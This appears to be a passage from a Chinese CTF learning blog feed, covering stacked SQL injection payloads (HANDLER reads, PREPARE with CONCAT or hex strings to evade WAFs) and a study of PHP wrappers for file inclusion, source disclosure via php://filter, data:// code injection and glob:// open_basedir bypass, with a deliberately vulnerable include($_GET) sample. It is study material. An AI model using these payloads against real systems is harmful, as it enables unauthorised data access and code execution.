title="解法3"></a>解法3</h2><p>利用handle方法读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;FlagHere&#96; open as &#96;a&#96;;</span><br><span class="line">handler &#96;a&#96; read next;#</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">HANDLER FlagHere OPEN;</span><br><span class="line">HANDLER FlagHere READ FIRST;</span><br><span class="line">HANDLER FlagHere CLOSE;#</span><br></pre></td></tr></table></figure><p>这的解法同样适用于随便注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; handler &#96;1919810931114514&#96; open as &#96;a&#96;; handler &#96;a&#96; read next;#</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>随便注中所说<code>安全与开发缺一不可</code>，结合wp堆叠注入的利用确实发人深省；<br>堆叠注入本就是以分号闭合前面语句，后面的命令全靠自己对sql的命令了解程度。<br>wp中的三种解法都是需要对sql语句有一定了解才整的出的~</p><p>终究是重在积累，要搭好地基啊</p><p><img src="https://i.loli.net/2021/03/09/UmXv1rDdRlbOk8T.png" alt="先随便建个库和表"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>alter：修改已知表的列（ 添加：add | 修改：modify，change | 删除：drop）</p><ul><li>添加列</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; add &quot;column_name&quot; type [first|after &quot;column_name&quot;];</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/09/NsIdApcy2Ji8LKl.png"></p><ul><li>删除列</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; drop &quot;column_name&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/09/ChgRjNpH8X6icv1.png"></p><ul><li>改表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name1&quot; rename to &quot;table_name2&quot;;</span><br></pre></td></tr></table></figure><ul><li>改变字段的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; modify &quot;column_name&quot; type;</span><br><span class="line">&#x2F;&#x2F;or</span><br><span class="line">alter table &quot;table_name&quot; change &quot;column_name&quot; &quot;column_name&quot; type;</span><br></pre></td></tr></table></figure><ul><li>改字段名 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;</span><br></pre></td></tr></table></figure><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>（ps：mysql版本&lt;4.1是不支持服务段预编译的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stm#预编译一条mysql语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...]#执行预编译的语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name#释放预编译语句</span><br><span class="line"># ps：当预编译条数达到阈值会报错</span><br></pre></td></tr></table></figure><ul><li>eg1：将数据插入表中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prepare try1 from &#39;insert into ttable1 select ?,?&#39;;#此处1个?匹配1个变量</span><br><span class="line">set @a&#x3D;111,@b&#x3D;&#39;hhh&#39;;</span><br><span class="line">execute try1 using @a,@b;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/09/t3pIw8hciF4lf6V.png" alt="数据成功插入到表中"></p><ul><li>eg2:查看表中信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a &#x3D; &#39;select * from &#96;ttable1&#96;&#39;;</span><br><span class="line">prepare try2 from @a;</span><br><span class="line">execute try2;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/09/2hAOLzexfM8Wa1m.png" alt="成功执行语句，查看表中数据"></p><ul><li>eg3:可以利用编码转换已经concat()组合，再ctf中绕过waf</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;ttable1&#96;;&#39;);</span><br><span class="line">&#x2F;&#x2F;or set @a &#x3D; 0x7365272c276c656374202a2066726f6d2060747461626c653160;</span><br><span class="line">prepare try3 from @a;</span><br><span class="line">execute try3;</span><br></pre></td></tr></table></figure><ul><li>释放：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare try1;</span><br></pre></td></tr></table></figure><h2 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># handle语法：</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><ul><li><p><code>HANDLER tbl_name OPEN [ [AS] alias]</code>:<br>打开一张表（不返回结果，但声明了一个句柄，句柄名通过可选项alias控制，否则默认为表名）<br><code>HANDLER tbl_name CLOSE</code>：关闭打开的句柄</p></li><li><p>创建索引：<code>CREATE INDEX index_name ON tbl_name（cln_name）</code><br>（INDEX为索引类型，也可以是char、varchar等等）</p></li><li><p>通过指定索引<code>HANDLER tbl_name READ index_name = value</code>，指定从哪一行开始<br>通过NEXT继续浏览，若指定一个值则从该值对应索引一行开始<br>（ps：按照索引查看时，会由索引对应的字段 升序 返回表信息）<br><code>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</code>:<br><code>first</code>获取第一行内容；<code>last</code>获取最后一行内容<br><code>next</code>获取索引后一行的内容；<code>prev</code>获取索引前面一行的内容</p></li><li><p><code>HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</code>：<br>同上，<code>first</code>获取第一行；<code>next</code>以此访问下一行</p></li><li><p>也可利用where和limit子句添加条件</p></li></ul><p>官方文档：（使用页面翻译–可能不太准确）</p><p><img src="https://i.loli.net/2021/03/09/4qavKBciRZ2VAne.png" alt="官方文档"></p><blockquote><p>sql约束：用以规定表中数据的规则<br><img src="https://i.loli.net/2021/03/09/8qAgPSLMfV2RIN9.png"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议的学习</title>
      <link href="2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次接触php伪协议是请学长帮忙看的一个站所涉及到的glob伪协议<br>之前就有学习的念头，后来因为种种原因（主要是拖延症）拖了3个多月。。<br>最近刷web题的时候也接触很多，就仔细看一下</p><p>顺便安利首歌，为了放在这还学了一门新活</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1459439332&auto=0&height=66"></iframe><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 上面播放器的代码如下（仅网易云外链链接，其他播放器请自行百度）</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;330&quot;</span> <span class="attr">height</span>=<span class="string">&quot;86&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=1&amp;id=32069326&amp;auto=0&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"># width(宽度) ; height(高度)</span><br><span class="line"># type = 歌曲(1) | 歌单(2) | 电台(3)</span><br><span class="line"># id = 歌曲ID号</span><br><span class="line"># auto = 自动播放(1) | 手动播放(0)</span><br></pre></td></tr></table></figure><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>虽说是为了解伪协议在渗透/ctf中的各种运用，但还是要去官方文档看看：</p><p>php支持的伪协议如下：（<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><blockquote><p>在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持；<br>且allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。</p></blockquote><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul><li><p>file:// — 访问本地文件系统；<br>ctf中常用于读取本地文件、配合curl_exec实现任意文件读取（curl支持伪协议）</p></li><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p></li><li><p>运用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xxx&#x3D;file:&#x2F;&#x2F;文件的绝对路径和文件名</span><br><span class="line"></span><br><span class="line">eg: ?xxx&#x3D;file:&#x2F;&#x2F;C:&#x2F;Users&#x2F;ls&#x2F;Desktop&#x2F;1.txt</span><br></pre></td></tr></table></figure><p>eg：file://读取+文件包含</p><blockquote><p>1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hhh&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hhh&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.txt：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li></ul><p>  <img src="https://i.loli.net/2021/02/24/g6w8WleFGKiBhQY.png" alt="成功读取并包含啦"></p><h2 id="http-、https"><a href="#http-、https" class="headerlink" title="http://、https://"></a>http://、https://</h2><ul><li><p>http:// – https:// — 访问 HTTP(s) 网址；允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源；<br>ctf中通常用于远程包含</p></li><li><p><code>allow_url_fopen</code>:on<br><code>allow_url_include</code> :on</p></li><li><p>运用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;file.php</span><br><span class="line">http:&#x2F;&#x2F;user:password@example.com</span><br></pre></td></tr></table></figure><p>eg:</p></li></ul><p><img src="https://i.loli.net/2021/02/24/PtXaz51VJiH8ujB.png" alt="先打开allow_url_fopen和allow_url_include"></p><p><img src="https://i.loli.net/2021/02/24/Zpq9OTWVRJvbMfo.png" alt="远程包含~"></p><h2 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a>zip:// &amp; bzip2:// &amp; zlib://</h2><ul><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响<br>zip:// 需<code>php版本&gt;=5.3.0</code></p></li><li><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名，可修改为任意后缀</p></li><li><p>运用：</p><blockquote><p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code>- 处理的是 ‘.zip’ 后缀的压缩包里的文件<br>zip://archive.zip#dir/file.txt<br><code>compress.bzip2://绝对路径 | 相对路径</code> - 处理的是 ‘.bz2’ 后缀的压缩包<br>compress.bzip2://file.bz2<br><code>compress.zlib://绝对路径 | 相对路径</code>- 处理的是 ‘.gz’ 后缀的压缩包<br>compress.zlib://file.gz </p></blockquote></li></ul><h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><ul><li><p><code>allow_url_fopen</code> ：on<br><code>allow_url_include</code>：on<br><code>PHP版本 &gt;= 5.2</code></p></li><li><p>运用：<code>data:资源类型;编码,内容</code><br><code>?xxx=data://text/plain;base64,(base64编码的内容)</code>或：<code>?xxx=data:text/plain,(url编码的内容)</code></p></li></ul><blockquote><p>eg:</p><p>xxx.php?file=<code>data://</code>text/plain,<?php phpinfo()?></p><p>xxx.php?file=<code>data://</code>text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p><p>或(省略//)</p><p>xxx.php?file=<code>data:</code>text/plain,<?php phpinfo()?></p><p>xxx.php?file=<code>data:</code>text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p></blockquote><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><ul><li>php:// — 访问各个输入/输出流；<br>其中又有：<br>php://stdin、 php://stdout 、 php://stderr  （允许直接访问 PHP 进程相应的输入或者输出流）<br>php://input、php://output、php://filter<br>php://fd、php://memory、php://temp</li><li><code>php://filter</code>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响;<br><code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code>受限于<code>allow_url_include</code></li><li>允许读取：<code>php://stdin</code>、 <code>php://input</code>、 <code>php://fd</code>、 <code>php://memory</code> 、 <code>php://temp</code><br>允许写入|追加：<code>php://stdout</code>、 <code>php://stderr</code>、 <code>php://output</code>、 <code>php://fd</code>、 <code>php://memory</code>、<code>php://temp</code><br>允许同时读写：<code>php://fd</code>、 <code>php://memory</code> 、 <code>php://temp</code></li></ul><h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h3><p><code>php://fd</code> 允许直接访问指定的文件描述符。 如 <code>php://fd/3</code> 引用了文件描述符 3</p><h3 id="php-memory-和-php-temp"><a href="#php-memory-和-php-temp" class="headerlink" title="php://memory 和 php://temp"></a>php://memory 和 php://temp</h3><p><code>php://memory</code> 和 <code>php://temp</code> 是类似文件包装器的数据流，允许读写临时数据。<br> 两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中， 而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</p><p><code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，<code>NN</code> 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p><p>eg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;hhh&quot;</span>];  </span><br><span class="line">file_put_contents(<span class="variable">$code</span>,<span class="string">&quot;output success&quot;</span>);   </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/24/i82sXIxVFB5Cc4N.png"></p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><ul><li>php://input-可以访问请求的原始数据，POST请求的情况下php://input可以获取post的数据<br>ps：<code>enctype=&quot;multipart/form-data&quot;</code> 时 php://input 是无效的</li><li>需开启<code>allow_url_include</code></li><li>利用方法：<br>① 将要GET的参数?xxx=php://input<br>② 用post方法传入想要file_get_contents()函数返回的值</li></ul><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><ul><li><p>是一种元封装器，设计用于数据流打开时的筛选过滤应用。可用于读写文件、甚至getshell</p></li><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p></li><li><p>参数如下：</p><table><thead><tr><th><strong>php://filter 参数</strong></th><th align="center"></th></tr></thead><tbody><tr><td>名称</td><td align="center">描述</td></tr><tr><td><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="center">必须。它指定了你要筛选过滤的数据流</td></tr><tr><td><code>read=&lt;读链的筛选列表&gt;</code></td><td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td><code>write=&lt;写链的筛选列表&gt;</code></td><td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td><code>&lt;；两个链的筛选列表&gt;</code></td><td align="center">任何没有以<code>read=</code>或<code>write=</code>作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table></li><li><p>运用：<br>eg：<code>php://filter/read=convert.base64-encode/resource=hhh.php</code><br>使用了过滤器：<code>convert.base64-encode</code>：将输入流进行base64编码；<br><code>resource=hhh.php</code>：数据源自文件hhh.php，也就是读取hhh.php文件嘛</p></li></ul><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>官方文档<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p><h5 id="字符串过滤器-string"><a href="#字符串过滤器-string" class="headerlink" title="字符串过滤器(string.*)"></a>字符串过滤器(string.*)</h5><p>每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应</p><ul><li><p>string.rot13：对字符串执行 ROT13 转换；等同于用 <code>str_rot13()</code>函数处理所有的流数据</p><blockquote><p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p></blockquote></li><li><p>string.toupper：将字符串转化为大写；等同于用 <code>strtoupper()</code>函数处理所有的流数据</p></li><li><p>string.tolower：将字符串转化为小写；等同于用 <code>strtolower()</code>函数处理所有的流数据</p></li><li><p><strong>string.strip_tags</strong>：从字符串中去除 HTML 和 PHP 标记；等同于用 <code>strip_tags()</code>函数处理所有的流数据<br>从5.0.0启用——到7.3.0废弃，官方强烈建议不使用此特性；<br>原因就在于此特性引发的各种漏洞，这里大致看了两个：<br>1、使用<code>php://filter/string.strip_tags</code>导致php7 segment fault，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录(<code>&lt;php7.2</code>)，再进行文件名爆破就可以getshell。<a href="https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/">例1：文件包含的一些getshell姿势 </a><br>2、PHP的标签本质上是一段xml代码，所以我们可以使用<code>php://filter</code>的<code>string.strip_tags</code>过滤器，去除这一段代码(<code>&lt;?php exit();?&gt;</code>)。<a href="https://xz.aliyun.com/t/7852#toc-1">例2：某OK最新版漏洞组合拳GETSHELL </a></p></li></ul><h5 id="转换过滤器-convert"><a href="#转换过滤器-convert" class="headerlink" title="转换过滤器(convert.*)"></a>转换过滤器(convert.*)</h5><ul><li>自 PHP 5.0.0</li><li>base64：<ul><li><code>convert.base64-encode</code>：对数据进行base64编码；等同于用base64_encode()处理所有的流数据</li><li><code>convert.base64-decode</code>：对数据进行base64解码；等同于用base64_decode()处理所有的流数据<br>ps：<code>convert.base64-encode</code>支持以一个关联数组给出的参数<br>1、<code>line-length</code>：决定分隔步长；base64 输出将被 <code>line-length</code>个字符为长度而截成块<br>2、<code>line-break-chars</code>：决定分隔符；每块将被用给出的字符隔开<br>(这些参数的效果和用<code>base64_encode()</code>再加上<code>chunk_split()</code>相同)</li></ul></li><li>quoted-printable（ASCII码二进制形式）：<ul><li><code>convert.quoted-printable-encode</code>：将 quoted-printable 字符串转换为 8-bit 二进制字符串；等同于用 quoted_printable_decode()函数处理所有的流数据</li><li><code>convert.quoted-printable-decode</code>：没有和 convert.quoted-printable-encode相对应的函数<br>ps：<code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。<br>1、<code>convert.quoted-printable-encode</code>：<code>line-length</code>、<code>line-break-chars</code>还有布尔参数 <code>binary</code>和 <code>force-encode-first</code><br>2、<code>convert.base64-decode</code>只支持 <code>line-break-chars</code>参数（作为从编码载荷中剥离的类型提示）</li></ul></li></ul><h5 id="压缩过滤器-zlib-bzip2"><a href="#压缩过滤器-zlib-bzip2" class="headerlink" title="压缩过滤器(zlib | bzip2.*)"></a>压缩过滤器(zlib | bzip2.*)</h5><p>ps：压缩过滤器 不产生命令行工具如 <code>gzip</code>的头和尾信息。只是压缩和解压数据流中的有效载荷部分</p><ul><li>自 PHP 5.1.0；</li><li><code>zlib.deflate（压缩）</code>、 <code>zlib.inflate（解压）</code><br><code>deflate</code>过滤器可以接受以一个关联数组传递的最多<strong>三</strong>个参数：<br>1、<code>level</code>：定义压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。其中：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）<br>2、<code>window</code>：是压缩回溯窗口大小，以二的次方表示（默认为15）。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。<br>3、<code>memory</code>用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。</li><li><code>bzip2.compress</code>和 <code>bzip2.decompress</code>工作的方式与上面讲的 zlib 过滤器相同。 <ul><li><code>bzip2.compress</code>接受以一个关联数组给出的最多<strong>两</strong>个参数：<br>1、<code>blocks</code>：(1-9)，指定分配多少个 100K 字节的内存块作为工作区<br>2、<code>work</code>：(0-250)，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法</li><li><code>bzip2.decompress</code>仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的 <code>small</code>单元传递。当 <code>small</code>设为 <code>&amp;true; 值</code>时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</li></ul></li></ul><h5 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h5><ul><li><code>mcrypt.*</code>、<code>mdecrypt.*</code>使用 libmcrypt 提供对称的加密和解密<br>支持 mcrypt 扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code><br>(<code>ciphername</code>是密码的名字,将被传递给 mcrypt_module_open())</li><li>mcrypt 过滤器参数：<table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">默认值</th><th align="left">取值举例</th></tr></thead><tbody><tr><td align="left">mode</td><td align="left">可选</td><td align="left">cbc</td><td align="left">cbc, cfb, ecb, nofb, ofb, stream</td></tr><tr><td align="left">algorithms_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.algorithms_dir’)</td><td align="left">algorithms 模块的目录</td></tr><tr><td align="left">modes_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.modes_dir’)</td><td align="left">modes 模块的目录</td></tr><tr><td align="left">iv</td><td align="left">必须</td><td align="left">N/A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td align="left">key</td><td align="left">必须</td><td align="left">N/A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table></li></ul><h2 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h2><ul><li><p>glob:// — 查找匹配的文件路径模式</p></li><li><p>PHP版本&gt;=5.3.0</p></li><li><p>运用：（这里是学长教的hh）</p><p><strong>设计缺陷导致的任意文件名列出</strong>：由于PHP在设计的时候（可以通过源码来进行分析），对于glob伪协议的实现过程中不检测open_basedir以及safe_mode也是不会检测的，由此可利用glob://罗列文件名<br>（也就是说在可读权限下，可以得到文件名，但无法读取文件内容；也就是单纯的罗列目录，能用来绕过open_basedir）</p></li></ul><h3 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h3><p>  只能列出根目录以及open_basedir()允许目录下的文件</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span></span><br><span class="line">var_dump(scandir(<span class="string">&quot;glob:///*&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;glob://./*&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(scandir(<span class="string">&quot;glob://../*&quot;</span>));</span><br><span class="line"><span class="comment">#  以下是学长的碎碎念</span></span><br><span class="line"><span class="comment"># （关键在于 scandir() + glob伪协议</span></span><br><span class="line"><span class="comment"># （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span></span><br><span class="line"><span class="comment"># （比如 opendir 吧</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h3 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h3><p>  DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 